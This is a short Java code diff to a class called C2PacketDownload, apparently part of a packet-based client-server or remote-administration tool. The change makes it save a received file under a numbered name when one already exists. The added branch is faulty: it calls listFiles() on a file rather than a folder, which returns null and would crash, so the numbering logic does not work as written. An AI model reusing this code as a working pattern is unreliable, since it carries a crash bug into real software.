@@ -18,12 +18,22 @@ public class C2PacketDownload implements IPacket
 	@Override
 	public void execute(Object object) throws Exception
 	{
-		final File file = new File(this.outputpath);
+		File file = new File(this.outputpath);
 		
 		if(!(file.exists()))
 		{
 			file.getParentFile().mkdirs();
 			file.createNewFile();
+		}
+		else
+		{
+			file = new File(this.outputpath + "#" + file.listFiles().length);
+			
+			if(!(file.exists()))
+			{
+				file.getParentFile().mkdirs();
+				file.createNewFile();
+			}
 		}
 		
 		final BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(file));
@@ -31,7 +41,7 @@ public class C2PacketDownload implements IPacket
 		writer.close();
 		
 		Logger.space();
-		Logger.log("downloaded file: " + this.outputpath);
+		Logger.log("downloaded file: " + file.getAbsolutePath());
 		Logger.space();
 		
 		System.out.print(Variables.instance.appname + " -> ");
